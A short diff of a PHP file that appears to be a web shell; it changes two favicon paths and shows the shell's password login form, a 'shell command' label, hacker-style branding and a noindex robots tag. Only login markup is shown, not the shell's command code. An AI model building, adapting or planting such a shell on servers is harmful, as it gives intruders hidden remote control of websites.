@@ -2352,7 +2352,7 @@ if(!empty($s_error)) $s_result = notif($s_error).$s_result;
 <title><?php echo $s_title; ?></title>
 <meta charset="utf-8">
 <meta name='robots' content='noindex, nofollow, noarchive'>
-<link rel='SHORTCUT ICON' href='consultadb/img/hi.ico'>
+<link rel='SHORTCUT ICON' href='hi.ico'>
 <?php echo get_code("css", $s_css); ?>
 </head>
 <body>
@@ -2394,7 +2394,7 @@ else echo "- shell command -";
 <?php } else{ ?>
 	<div style='width:100%;text-align:center;'>
 	<form action='<?php echo $s_self; ?>' method='post'>
-	<img src='consultadb/img/hi.ico' style='margin:2px;vertical-align:middle;' />
+	<img src='hi.ico' style='margin:2px;vertical-align:middle;' />
 	Ⱨ₳₵₭ɆRST0&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
 	<input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />
 	</form>
